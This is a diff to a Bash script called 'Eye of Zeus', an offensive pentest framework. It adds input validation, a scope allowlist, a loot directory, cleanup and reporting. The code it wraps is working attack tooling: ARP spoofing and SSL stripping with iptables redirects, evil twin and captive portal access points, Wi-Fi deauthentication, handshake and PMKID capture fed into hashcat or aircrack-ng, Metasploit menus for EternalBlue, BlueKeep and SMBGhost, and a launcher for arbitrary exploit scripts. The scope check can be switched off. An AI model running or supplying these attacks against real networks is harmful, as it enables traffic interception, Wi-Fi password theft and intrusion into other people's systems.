@@ -22,13 +22,29 @@ BOLD="\e[1m"
 RESET="\e[0m"
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Global state / configuration
+# ─────────────────────────────────────────────────────────────────────────────
+EOZ_VERSION="1.1.0"
+EOZ_HOME="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+LOOT_DIR=""              # per-engagement output directory (set by init_loot)
+SESSION_LOG=""           # session transcript path (set by init_loot)
+SCOPE_FILE=""            # in-scope allowlist path (set by load_scope)
+EOZ_NO_SCOPE="${EOZ_NO_SCOPE:-0}"
+
+# Resources to unwind on exit (consumed by restore_all).
+EOZ_PIDS=()              # background PIDs we spawned
+EOZ_IPT_RULES=()         # nat-table rule specs we added
+EOZ_MON_IFACES=()        # monitor-mode interfaces we started
+EOZ_IP_FWD_CHANGED=0     # whether we enabled ip_forward
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Interactive UI / animation helpers
 # ─────────────────────────────────────────────────────────────────────────────
 
 # Hide/show the cursor and always restore it on exit.
 hide_cursor() { tput civis 2>/dev/null; }
 show_cursor() { tput cnorm 2>/dev/null; }
-trap 'show_cursor' EXIT
+trap 'restore_all; show_cursor' EXIT
 
 # Typewriter effect: prints text one char at a time.
 # Usage: type_text "message" [color] [delay]
@@ -103,6 +119,277 @@ default_iface() {
 # Return the gateway IP of the primary default route (first match only).
 default_gateway() {
     ip route show default 2>/dev/null | awk '/default/ {print $3; exit}'
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (1) Input validation — everything the user types flows into command strings
+#     (msfconsole -x, shell), so validate before use.
+# ─────────────────────────────────────────────────────────────────────────────
+is_ip() {
+    local ip="$1" o
+    [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || return 1
+    local IFS=.
+    for o in $ip; do (( o >= 0 && o <= 255 )) || return 1; done
+    return 0
+}
+is_cidr() {
+    [[ "$1" =~ ^[0-9]+(\.[0-9]+){3}/[0-9]+$ ]] || return 1
+    is_ip "${1%/*}" && (( ${1#*/} >= 0 && ${1#*/} <= 32 ))
+}
+is_ip_or_cidr() { is_ip "$1" || is_cidr "$1"; }
+is_mac()   { [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; }
+is_iface() { [[ "$1" =~ ^[A-Za-z0-9._-]+$ ]] && [ -e "/sys/class/net/$1" ]; }
+is_port()  { [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 65535 )); }
+
+# prompt_valid "message" validator_fn -> echoes a valid value on stdout,
+# re-prompting until the validator accepts it. Prompts go to stderr so the
+# value can be captured with $(...).
+prompt_valid() {
+    local msg="$1" validator="$2" val
+    while true; do
+        printf "%b" "${HYPR_YELLOW}${BOLD}${msg} ${RESET}" >&2
+        read -r val
+        if "$validator" "$val"; then printf '%s' "$val"; return 0; fi
+        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Invalid ${validator#is_} value. Try again.${RESET}" >&2
+    done
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (2) Scope guard — refuse targets that are not on the engagement allowlist.
+# ─────────────────────────────────────────────────────────────────────────────
+load_scope() { SCOPE_FILE="${EOZ_SCOPE_FILE:-$EOZ_HOME/scope.txt}"; }
+
+ip_to_int() {
+    local IFS=. a b c d; read -r a b c d <<< "$1"
+    echo $(( (a<<24) + (b<<16) + (c<<8) + d ))
+}
+ip_in_cidr() {
+    local ip="$1" cidr="$2" base bits mask
+    base="${cidr%/*}"; bits="${cidr#*/}"
+    [ "$bits" -eq 0 ] && return 0
+    mask=$(( (0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF ))
+    [ $(( $(ip_to_int "$ip") & mask )) -eq $(( $(ip_to_int "$base") & mask )) ]
+}
+# Match a target (IP / BSSID / SSID) against scope.txt (IPs, CIDRs, MACs, names).
+in_scope() {
+    local t="$1" tnorm line entry
+    tnorm="$(printf '%s' "$t" | tr 'A-F' 'a-f')"
+    while IFS= read -r line || [ -n "$line" ]; do
+        line="${line%%#*}"; line="$(printf '%s' "$line" | xargs 2>/dev/null)"
+        [ -z "$line" ] && continue
+        entry="$(printf '%s' "$line" | tr 'A-F' 'a-f')"
+        if is_cidr "$line" && is_ip "$t"; then
+            ip_in_cidr "$t" "$line" && return 0
+        elif [ "$entry" = "$tnorm" ]; then
+            return 0
+        fi
+    done < "$SCOPE_FILE"
+    return 1
+}
+# Returns 0 if the caller may attack $1, non-zero if it must abort.
+scope_guard() {
+    local t="$1" a
+    [ "$EOZ_NO_SCOPE" = "1" ] && return 0
+    if [ ! -s "$SCOPE_FILE" ]; then
+        printf "%b\n" "${HYPR_YELLOW}${BOLD}[!] No scope file ($SCOPE_FILE) — you are responsible for authorization.${RESET}" >&2
+        printf "%b" "${HYPR_YELLOW}${BOLD}[?] Proceed against '$t' anyway? (y/N): ${RESET}" >&2
+        read -r a; [[ "$a" =~ ^[Yy] ]] && return 0
+        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Aborted: out of scope.${RESET}" >&2; return 1
+    fi
+    in_scope "$t" && return 0
+    printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] '$t' is NOT in scope ($SCOPE_FILE). Refusing.${RESET}" >&2
+    return 1
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (3)(4) Session log + loot directory — one engagement folder per run.
+# ─────────────────────────────────────────────────────────────────────────────
+init_loot() {
+    local base="${EOZ_LOOT_BASE:-$HOME/EyeOfZeus-loot}"
+    LOOT_DIR="$base/$(date +%Y%m%d_%H%M%S)"
+    mkdir -p "$LOOT_DIR"/{scans,hashes,handshakes,creds,reports,logs}
+    SESSION_LOG="$LOOT_DIR/logs/session.log"
+    : > "$SESSION_LOG"
+}
+# loot <relative/path> -> absolute path inside the engagement folder.
+loot() { printf '%s' "$LOOT_DIR/$1"; }
+# save_result <category> <file>  copies an artifact into the loot folder.
+save_result() {
+    local cat="$1" src="$2"
+    [ -z "$LOOT_DIR" ] && return 1
+    mkdir -p "$LOOT_DIR/$cat"
+    [ -e "$src" ] && cp -a "$src" "$LOOT_DIR/$cat/" 2>/dev/null
+}
+# Tee all output to the session log, stripping ANSI codes from the file copy.
+start_session_log() {
+    [ -n "$SESSION_LOG" ] || return 0
+    exec > >(tee >(sed -u 's/\x1b\[[0-9;]*[A-Za-z]//g' >> "$SESSION_LOG")) 2>&1
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (5) Interface picker — list real interfaces instead of typing "wlan0".
+# ─────────────────────────────────────────────────────────────────────────────
+# select_interface [wifi]  -> echoes chosen interface; menu printed to stderr.
+select_interface() {
+    local want="${1:-any}" ifaces=() dev i n wireless
+    for dev in $(ls /sys/class/net 2>/dev/null); do
+        [ "$dev" = "lo" ] && continue
+        if [ "$want" = "wifi" ] && [ ! -d "/sys/class/net/$dev/wireless" ]; then continue; fi
+        ifaces+=("$dev")
+    done
+    if [ ${#ifaces[@]} -eq 0 ]; then
+        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] No matching interfaces found${RESET}" >&2; return 1
+    fi
+    printf "%b\n" "${HYPR_CYAN}${BOLD}Available interfaces:${RESET}" >&2
+    for i in "${!ifaces[@]}"; do
+        dev="${ifaces[$i]}"; wireless=""
+        [ -d "/sys/class/net/$dev/wireless" ] && wireless=" (wifi)"
+        printf "  %b\n" "${GRADIENT_PINK}${BOLD}$((i+1)))${RESET} ${dev}${wireless}" >&2
+    done
+    printf "%b" "${HYPR_YELLOW}${BOLD}[?] Select interface #: ${RESET}" >&2
+    read -r n
+    if [[ "$n" =~ ^[0-9]+$ ]] && [ "$n" -ge 1 ] && [ "$n" -le ${#ifaces[@]} ]; then
+        printf '%s' "${ifaces[$((n-1))]}"; return 0
+    fi
+    printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Invalid selection${RESET}" >&2; return 1
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (6) Per-action tool check — catches missing binaries and name drift.
+# ─────────────────────────────────────────────────────────────────────────────
+require_tool() {
+    local cmd="$1" pkg="${2:-$1}"
+    command -v "$cmd" >/dev/null 2>&1 && return 0
+    printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Required tool '$cmd' not found.${RESET}" >&2
+    printf "%b\n" "${HYPR_YELLOW}${BOLD}[!] Install it with: sudo apt install $pkg${RESET}" >&2
+    return 1
+}
+# Resolve the pcapng converter across Kali versions (name changed over time).
+hcx_convert_tool() {
+    command -v hcxpcapngtool 2>/dev/null || command -v hcxpcaptool 2>/dev/null
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (7) Cracking helpers — actually crack a capture instead of just saving it.
+# ─────────────────────────────────────────────────────────────────────────────
+pick_wordlist() {
+    local wl="/usr/share/wordlists/rockyou.txt" w
+    [ ! -f "$wl" ] && [ -f "$wl.gz" ] && gunzip -k "$wl.gz" 2>/dev/null
+    printf "%b" "${HYPR_YELLOW}${BOLD}[?] Wordlist [${wl}]: ${RESET}" >&2
+    read -r w; [ -n "$w" ] && wl="$w"
+    if [ ! -f "$wl" ]; then
+        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Wordlist not found: $wl${RESET}" >&2; return 1
+    fi
+    printf '%s' "$wl"
+}
+crack_22000() {
+    local hashfile="$1" wl
+    require_tool hashcat || return 1
+    if [ ! -s "$hashfile" ]; then
+        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] No hashes captured in $hashfile${RESET}"; return 1
+    fi
+    wl="$(pick_wordlist)" || return 1
+    hashcat -m 22000 "$hashfile" "$wl"
+}
+crack_handshake() {
+    local cap="$1" bssid="$2" wl
+    require_tool aircrack-ng || return 1
+    wl="$(pick_wordlist)" || return 1
+    aircrack-ng -w "$wl" ${bssid:+-b "$bssid"} "$cap"
+}
+maybe_crack() {
+    # maybe_crack 22000|handshake <file> [bssid]
+    local kind="$1" f="$2" bssid="${3:-}" a
+    printf "%b" "${HYPR_YELLOW}${BOLD}[?] Crack $f now? (y/N): ${RESET}"
+    read -r a; [[ "$a" =~ ^[Yy] ]] || return 0
+    case "$kind" in
+        22000)     crack_22000 "$f" ;;
+        handshake) crack_handshake "$f" "$bssid" ;;
+    esac
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (8) Single cleanup routine — everything unwinds through here (EXIT + Ctrl+C).
+# ─────────────────────────────────────────────────────────────────────────────
+track_pid()   { EOZ_PIDS+=("$1"); }
+track_mon()   { EOZ_MON_IFACES+=("$1"); }
+enable_ip_forward() { echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null; EOZ_IP_FWD_CHANGED=1; }
+# add_nat_rule "<rule spec after -A>"  applies it now and records it for teardown.
+add_nat_rule() { iptables -t nat -A $1 2>/dev/null; EOZ_IPT_RULES+=("$1"); }
+
+restore_all() {
+    local p r m
+    for p in "${EOZ_PIDS[@]}"; do kill "$p" 2>/dev/null; done
+    EOZ_PIDS=()
+    for r in "${EOZ_IPT_RULES[@]}"; do iptables -t nat -D $r 2>/dev/null; done
+    EOZ_IPT_RULES=()
+    for m in "${EOZ_MON_IFACES[@]}"; do airmon-ng stop "$m" 2>/dev/null; done
+    EOZ_MON_IFACES=()
+    if [ "$EOZ_IP_FWD_CHANGED" = "1" ]; then
+        echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
+        EOZ_IP_FWD_CHANGED=0
+    fi
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (9) Reporting — roll the loot folder into a Markdown summary.
+# ─────────────────────────────────────────────────────────────────────────────
+generate_report() {
+    if [ -z "$LOOT_DIR" ]; then
+        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] No active engagement.${RESET}"; return 1
+    fi
+    local rpt="$LOOT_DIR/reports/report.md" d
+    {
+        echo "# Eye of Zeus Engagement Report"
+        echo
+        echo "- Generated: $(date '+%Y-%m-%d %H:%M:%S')"
+        echo "- Operator: $(whoami)@$(hostname 2>/dev/null)"
+        echo "- Scope file: ${SCOPE_FILE:-none}"
+        echo "- Loot directory: \`$LOOT_DIR\`"
+        echo
+        echo "## Collected artifacts"
+        for d in scans hashes handshakes creds; do
+            echo
+            echo "### $d"
+            if compgen -G "$LOOT_DIR/$d/*" >/dev/null 2>&1; then
+                ( cd "$LOOT_DIR/$d" && ls -1 ) | sed 's/^/- /'
+            else
+                echo "- (none)"
+            fi
+        done
+        echo
+        echo "## Session log"
+        echo "- \`$SESSION_LOG\`"
+    } > "$rpt"
+    printf "%b\n" "${DEBIAN_GREEN}${BOLD}[✓] Report written: $rpt${RESET}"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# (10) CLI: help / version / self-update.
+# ─────────────────────────────────────────────────────────────────────────────
+show_version() { printf "%b\n" "${HYPR_CYAN}${BOLD}Eye of Zeus v${EOZ_VERSION}${RESET}"; }
+show_help() {
+    cat <<EOF
+Eye of Zeus v${EOZ_VERSION} - network audit & penetration-testing framework
+
+Usage: sudo ./Eye_Of_Zeus_2.sh [options]
+
+Options:
+  -h, --help          Show this help and exit
+  -V, --version       Show version and exit
+      --update        git pull the latest version and exit
+      --scope FILE    Use FILE as the in-scope allowlist (IPs / CIDRs / BSSIDs)
+      --no-scope      Disable scope enforcement (you accept responsibility)
+      --loot DIR      Base directory for engagement output
+EOF
+}
+self_update() {
+    require_tool git || return 1
+    if [ -d "$EOZ_HOME/.git" ]; then
+        ( cd "$EOZ_HOME" && git pull --ff-only )
+    else
+        printf "%b\n" "${DEBIAN_RED}${BOLD}[✗] Not a git checkout: $EOZ_HOME${RESET}"; return 1
+    fi
 }
 
 # Function for modern headers
@@ -238,24 +525,25 @@ network_discovery() {
 
     case $choice in
         1)
-            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter network range (e.g., 192.168.1.0/24):${RESET}"
-            read -r network
+            require_tool nmap || return
+            local network; network="$(prompt_valid "[?] Enter network range (e.g., 192.168.1.0/24):" is_ip_or_cidr)"
             echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting quick scan on $network...${RESET}"
-            nmap -sn "$network" -oN "network_scan_$(date +%Y%m%d_%H%M%S).txt"
+            nmap -sn "$network" -oN "$(loot "scans/ping_sweep_$(date +%H%M%S).txt")"
             ;;
         2)
-            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter network range (e.g., 192.168.1.0/24):${RESET}"
-            read -r network
+            require_tool nmap || return
+            local network; network="$(prompt_valid "[?] Enter network range (e.g., 192.168.1.0/24):" is_ip_or_cidr)"
             echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting deep scan on $network...${RESET}"
-            nmap -sS -sV -O -T4 "$network" -oN "deep_scan_$(date +%Y%m%d_%H%M%S).txt"
+            nmap -sS -sV -O -T4 "$network" -oN "$(loot "scans/deep_scan_$(date +%H%M%S).txt")"
             ;;
         3)
+            require_tool arp-scan || return
             echo -e "${DEBIAN_BLUE}${BOLD}[*] Starting ARP scan...${RESET}"
-            arp-scan --localnet | tee "arp_scan_$(date +%Y%m%d_%H%M%S).txt"
+            arp-scan --localnet | tee "$(loot "scans/arp_scan_$(date +%H%M%S).txt")"
             ;;
         4)
             echo -e "${DEBIAN_BLUE}${BOLD}[*] Scanning for WiFi networks...${RESET}"
-            nmcli dev wifi list | tee "wifi_scan_$(date +%Y%m%d_%H%M%S).txt"
+            nmcli dev wifi list | tee "$(loot "scans/wifi_scan_$(date +%H%M%S).txt")"
             ;;
         5)
             return
@@ -284,16 +572,16 @@ mitm_attacks() {
 
     case $choice in
         1)
-            echo -e "\n${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
-            read -r target
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter gateway IP:${RESET}"
-            read -r gateway
+            require_tool arpspoof dsniff || return
+            local target gateway; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
+            gateway="$(prompt_valid "[?] Enter gateway IP:" is_ip)"
+            scope_guard "$target" || return
             local iface; iface="$(default_iface)"
-            echo 1 > /proc/sys/net/ipv4/ip_forward
-            arpspoof -i "$iface" -t "$target" "$gateway" &
-            arpspoof -i "$iface" -t "$gateway" "$target" &
+            enable_ip_forward
+            arpspoof -i "$iface" -t "$target" "$gateway" & track_pid $!
+            arpspoof -i "$iface" -t "$gateway" "$target" & track_pid $!
             echo -e "${DEBIAN_GREEN}${BOLD}[✓] ARP spoofing started (Ctrl+C to stop and return to menu)${RESET}"
-            trap 'kill $(jobs -p) 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward; trap - INT; return' INT
+            trap 'restore_all; trap - INT; return' INT
             sleep infinity
             ;;
         2)
@@ -305,18 +593,19 @@ mitm_attacks() {
             ;;
         3)
             echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Advanced SSL Stripping${RESET}"
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
-            read -r target
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter gateway IP:${RESET}"
-            read -r gateway
+            require_tool sslstrip || return
+            require_tool arpspoof dsniff || return
+            local target gateway; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
+            gateway="$(prompt_valid "[?] Enter gateway IP:" is_ip)"
+            scope_guard "$target" || return
             local iface; iface="$(default_iface)"
-            echo 1 > /proc/sys/net/ipv4/ip_forward
-            iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
-            sslstrip -a -l 8080 &
-            arpspoof -i "$iface" -t "$target" "$gateway" &
-            arpspoof -i "$iface" -t "$gateway" "$target" &
+            enable_ip_forward
+            add_nat_rule "PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080"
+            sslstrip -a -l 8080 & track_pid $!
+            arpspoof -i "$iface" -t "$target" "$gateway" & track_pid $!
+            arpspoof -i "$iface" -t "$gateway" "$target" & track_pid $!
             echo -e "${DEBIAN_GREEN}${BOLD}[✓] SSL stripping started (Ctrl+C to stop and return to menu)${RESET}"
-            trap 'kill $(jobs -p) 2>/dev/null; iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward; trap - INT; return' INT
+            trap 'restore_all; trap - INT; return' INT
             sleep infinity
             ;;
         4)
@@ -327,8 +616,9 @@ mitm_attacks() {
             ;;
         5)
             echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Captive Portal Attack${RESET}"
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
-            read -r interface
+            require_tool dnsmasq || return
+            require_tool hostapd || return
+            local interface; interface="$(select_interface wifi)" || return
             echo -e "${HYPR_YELLOW}${BOLD}[?] Enter SSID for fake AP:${RESET}"
             read -r ssid
             echo -e "${HYPR_YELLOW}${BOLD}[?] Enter redirect URL:${RESET}"
@@ -354,23 +644,24 @@ ignore_broadcast_ssid=0" > /tmp/hostapd.conf
             dnsmasq -C /tmp/dnsmasq.conf -d &
             hostapd -B /tmp/hostapd.conf
             echo -e "${DEBIAN_GREEN}${BOLD}[✓] Captive portal started on $ssid (Ctrl+C to stop and return to menu)${RESET}"
-            trap 'pkill dnsmasq 2>/dev/null; pkill hostapd 2>/dev/null; ifconfig "$interface" down 2>/dev/null; trap - INT; return' INT
+            trap 'pkill dnsmasq 2>/dev/null; pkill hostapd 2>/dev/null; ifconfig "$interface" down 2>/dev/null; restore_all; trap - INT; return' INT
             sleep infinity
             ;;
         6)
             echo -e "\n${DEBIAN_BLUE}${BOLD}[*] Evil Twin Attack${RESET}"
+            require_tool hostapd || return
+            require_tool airmon-ng aircrack-ng || return
             echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target AP SSID:${RESET}"
             read -r target_ssid
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
-            read -r interface
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter channel:${RESET}"
-            read -r channel
+            local interface; interface="$(select_interface wifi)" || return
+            local channel; channel="$(prompt_valid "[?] Enter channel (1-165):" is_port)"
 
             # Capture the real monitor interface name from airmon-ng output
             # (it is not always "<iface>mon").
             local mon_iface
             mon_iface="$(airmon-ng start "$interface" | grep -oE '(monitor mode.*enabled.*on \[?[a-z0-9]+\]?[a-z0-9]*|\[phy[0-9]+\][a-z0-9]+)' | grep -oE '[a-z0-9]+mon|[a-z0-9]+$' | tail -1)"
             [ -z "$mon_iface" ] && mon_iface="${interface}mon"
+            track_mon "$mon_iface"
 
             # Terse nmcli output avoids backslash-escaped colons in the BSSID.
             local target_bssid
@@ -392,7 +683,7 @@ ignore_broadcast_ssid=0" > /tmp/evil_twin.conf
 
             hostapd -B /tmp/evil_twin.conf
             echo -e "${DEBIAN_GREEN}${BOLD}[✓] Evil Twin AP started (Ctrl+C to stop and return to menu)${RESET}"
-            trap 'pkill hostapd 2>/dev/null; airmon-ng stop "$mon_iface" 2>/dev/null; trap - INT; return' INT
+            trap 'pkill hostapd 2>/dev/null; restore_all; trap - INT; return' INT
             sleep infinity
             ;;
         7)
@@ -421,8 +712,9 @@ exploitation() {
         1)
             banner
             modern_header "SMB EXPLOITATION"
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
-            read -r target
+            require_tool msfconsole metasploit-framework || return
+            local target; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
+            scope_guard "$target" || return
             echo -e "\n${HYPR_CYAN}${BOLD}1) EternalBlue (MS17-010)${RESET}"
             echo -e "${HYPR_CYAN}${BOLD}2) BlueKeep (CVE-2019-0708)${RESET}"
             echo -e "${HYPR_CYAN}${BOLD}3) SMBGhost (CVE-2020-0796)${RESET}"
@@ -464,8 +756,8 @@ exploitation() {
         2)
             banner
             modern_header "RDP EXPLOITATION"
-            echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
-            read -r target
+            local target; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
+            scope_guard "$target" || return
             echo -e "\n${HYPR_CYAN}${BOLD}1) BlueKeep (CVE-2019-0708)${RESET}"
             echo -e "${HYPR_CYAN}${BOLD}2) Brute Force${RESET}"
             echo -e "${DEBIAN_RED}${BOLD}3) Back${RESET}"
@@ -552,65 +844,78 @@ exploitation() {
 
             case $wifi_choice in
                 1)
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
-                    read -r interface
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
-                    read -r bssid
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target channel:${RESET}"
-                    read -r channel
+                    require_tool airmon-ng aircrack-ng || return
+                    require_tool airodump-ng aircrack-ng || return
+                    local interface; interface="$(select_interface wifi)" || return
+                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
+                    scope_guard "$bssid" || return
+                    local channel; channel="$(prompt_valid "[?] Enter target channel (1-165):" is_port)"
                     local mon_iface
                     mon_iface="$(airmon-ng start "$interface" | grep -oE '[a-z0-9]+mon' | tail -1)"
                     [ -z "$mon_iface" ] && mon_iface="${interface}mon"
-                    airodump-ng -c "$channel" --bssid "$bssid" -w "handshake" "$mon_iface" &
-                    local dump_pid=$!
+                    track_mon "$mon_iface"
+                    local hs_prefix; hs_prefix="$(loot "handshakes/handshake_$(date +%H%M%S)")"
+                    airodump-ng -c "$channel" --bssid "$bssid" -w "$hs_prefix" "$mon_iface" &
+                    local dump_pid=$!; track_pid "$dump_pid"
                     sleep 10
                     aireplay-ng -0 5 -a "$bssid" "$mon_iface"
                     sleep 10
                     kill "$dump_pid" 2>/dev/null
-                    airmon-ng stop "$mon_iface"
-                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Handshake captured. Use aircrack-ng to crack it.${RESET}"
+                    airmon-ng stop "$mon_iface" 2>/dev/null
+                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] Handshake capture saved to ${hs_prefix}-01.cap${RESET}"
+                    maybe_crack handshake "${hs_prefix}-01.cap" "$bssid"
                     ;;
                 2)
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
-                    read -r interface
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
-                    read -r bssid
+                    require_tool hcxdumptool hcxtools || return
+                    local conv; conv="$(hcx_convert_tool)"
+                    if [ -z "$conv" ]; then require_tool hcxpcapngtool hcxtools; return; fi
+                    local interface; interface="$(select_interface wifi)" || return
+                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
+                    scope_guard "$bssid" || return
                     # hcxdumptool 6.3.0+/7.x dropped --filterlist_ap/--filtermode/-o/--enable_status.
                     # Filtering is now done with a compiled Berkeley Packet Filter (--bpf),
                     # output is -w, and the live status display is --rds. hcxdumptool also
                     # manages the interface itself, so do NOT put the card into monitor mode.
                     local bssid_raw bpf_file="/tmp/eoz_pmkid_filter.bpf"
+                    local pcap; pcap="$(loot "handshakes/pmkid_$(date +%H%M%S).pcapng")"
+                    local hashf; hashf="$(loot "hashes/pmkid_$(date +%H%M%S).22000")"
                     bssid_raw="$(echo "$bssid" | tr -d ':-' | tr 'A-F' 'a-f')"
                     echo -e "${HYPR_YELLOW}${BOLD}[*] Capturing for 60s (Ctrl+C to stop early)...${RESET}"
                     if hcxdumptool --bpfc="wlan addr3 ${bssid_raw}" > "$bpf_file" 2>/dev/null && [ -s "$bpf_file" ]; then
-                        timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --bpf="$bpf_file" --rds=1 \
-                            || timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --rds=1
+                        timeout 60 hcxdumptool -i "$interface" -w "$pcap" --bpf="$bpf_file" --rds=1 \
+                            || timeout 60 hcxdumptool -i "$interface" -w "$pcap" --rds=1
                     else
                         echo -e "${DEBIAN_RED}${BOLD}[!] BPF filter failed; capturing all APs.${RESET}"
-                        timeout 60 hcxdumptool -i "$interface" -w "pmkid.pcapng" --rds=1
+                        timeout 60 hcxdumptool -i "$interface" -w "$pcap" --rds=1
                     fi
-                    hcxpcapngtool -o "pmkid_hash" "pmkid.pcapng"
-                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] PMKID saved to pmkid_hash. Use hashcat -m 22000 to crack it.${RESET}"
+                    "$conv" -o "$hashf" "$pcap"
+                    echo -e "${DEBIAN_GREEN}${BOLD}[✓] PMKID hash saved to $hashf (hashcat -m 22000).${RESET}"
+                    maybe_crack 22000 "$hashf"
                     ;;
                 3)
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
-                    read -r interface
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
-                    read -r bssid
+                    require_tool reaver || return
+                    local interface; interface="$(select_interface wifi)" || return
+                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
+                    scope_guard "$bssid" || return
                     reaver -i "$interface" -b "$bssid" -vv
                     ;;
                 4)
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter interface (e.g., wlan0):${RESET}"
-                    read -r interface
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target BSSID:${RESET}"
-                    read -r bssid
+                    require_tool airmon-ng aircrack-ng || return
+                    require_tool aireplay-ng aircrack-ng || return
+                    local interface; interface="$(select_interface wifi)" || return
+                    local bssid; bssid="$(prompt_valid "[?] Enter target BSSID:" is_mac)"
+                    scope_guard "$bssid" || return
                     echo -e "${HYPR_YELLOW}${BOLD}[?] Enter client MAC (leave empty for broadcast):${RESET}"
                     read -r client
+                    if [ -n "$client" ] && ! is_mac "$client"; then
+                        echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid client MAC${RESET}"; return
+                    fi
                     local mon_iface
                     mon_iface="$(airmon-ng start "$interface" | grep -oE '[a-z0-9]+mon' | tail -1)"
                     [ -z "$mon_iface" ] && mon_iface="${interface}mon"
+                    track_mon "$mon_iface"
                     echo -e "${DEBIAN_GREEN}${BOLD}[✓] Deauth running (Ctrl+C to stop and restore card)${RESET}"
-                    trap 'airmon-ng stop "$mon_iface" 2>/dev/null; trap - INT; return' INT
+                    trap 'restore_all; trap - INT; return' INT
                     if [ -z "$client" ]; then
                         aireplay-ng -0 0 -a "$bssid" "$mon_iface"
                     else
@@ -644,8 +949,11 @@ exploitation() {
                 2)
                     echo -e "${HYPR_YELLOW}${BOLD}[?] Enter exploit path:${RESET}"
                     read -r exploit_path
-                    echo -e "${HYPR_YELLOW}${BOLD}[?] Enter target IP:${RESET}"
-                    read -r target
+                    if [ ! -f "$exploit_path" ]; then
+                        echo -e "${DEBIAN_RED}${BOLD}[✗] Exploit not found: $exploit_path${RESET}"; return
+                    fi
+                    local target; target="$(prompt_valid "[?] Enter target IP:" is_ip)"
+                    scope_guard "$target" || return
                     python3 "$exploit_path" "$target"
                     ;;
                 3)
@@ -886,6 +1194,32 @@ WantedBy=multi-user.target" > "/etc/systemd/system/$service_name.service"
     read -r
 }
 
+# Session & report menu
+session_menu() {
+    banner
+    modern_header "SESSION & REPORT"
+    echo -e "${HYPR_CYAN}${BOLD}1) Generate report${RESET}"
+    echo -e "${HYPR_CYAN}${BOLD}2) Show loot directory${RESET}"
+    echo -e "${HYPR_CYAN}${BOLD}3) Self-update (git pull)${RESET}"
+    echo -e "${HYPR_CYAN}${BOLD}4) About / version${RESET}"
+    echo -e "${DEBIAN_RED}${BOLD}5) Back${RESET}"
+    echo -e "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
+    read -r s_choice
+
+    case $s_choice in
+        1) generate_report ;;
